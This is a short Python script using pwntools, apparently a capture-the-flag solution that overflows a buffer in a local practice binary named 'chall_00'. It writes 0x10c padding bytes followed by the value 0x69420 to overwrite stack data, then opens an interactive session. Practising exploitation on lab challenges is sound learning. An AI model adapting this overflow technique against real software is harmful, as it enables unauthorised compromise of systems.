from pwn import *
binary = context.binary = ELF('./chall_00')
p = process(binary.path)
p.sendline((0x110-0x4)*b'A'+p32(0x69420))
p.interactive()

